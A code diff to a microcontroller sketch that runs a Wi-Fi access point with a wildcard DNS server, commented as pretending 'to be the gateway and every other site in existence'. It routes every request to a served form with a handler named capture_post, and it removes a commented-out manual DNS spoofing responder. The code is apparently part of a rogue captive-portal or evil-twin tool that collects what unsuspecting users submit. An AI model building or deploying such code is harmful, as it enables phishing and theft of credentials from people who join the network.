@@ -60,6 +60,7 @@ void setup() {
   
   WiFi.softAPConfig(gateway, gateway, subnet);
   WiFi.softAP("Full_House", "peepeepoopoo");
+
   if (!LittleFS.begin()){
     Serial.println("error: failed to mount LittleFS");
     return;
@@ -76,37 +77,16 @@ void setup() {
   webpage = web_file.readString();
   web_file.close();
   webpage.replace("VENDOR", "peepeepoopoo");
-  
-
-  web.on("/", HTTP_GET, show_form);
-  web.on("/", HTTP_POST, capture_post);
-  web.begin();
 
   // pretend to be the gateway and every other site in existence
   dns.start(DNS_PORT, "*", gateway);
+
+  web.on("/", HTTP_GET, show_form);
+  web.on("/", HTTP_POST, capture_post);
+  web.onNotFound(show_form);
+  web.begin();
 }
 
 void loop() {
   dns.processNextRequest();
 }
-
-// TODO: manual DNS implementation
-
-// s = socket(socket.AF_INET, socket.SOCK_DGRAM)
-// s.bind(('0.0.0.0', 53))
-// while(true) {
-//   data, addr = s.recvfrom(256)
-//   response = (
-//       data[:2]
-//       + b'\x81\x80'
-//       + data[4:6] * 2
-//       + b'\x00\x00\x00\x00'  // questions and answers counts
-//       + data[12:]  // original query
-//       + b'\xC0\x0C'  // pointer to domain name above
-//       + b'\x00\x01\x00\x01'  // type and class (A record / IN class)
-//       + b'\x00\x00\x00\x3C'  // time to live
-//       + b'\x00\x04'  // response length (4 bytes = 1 IPv4 address)
-//       + bytes([192, 168, 0, 1])
-//   )
-//   s.sendto(response, addr);
-// }
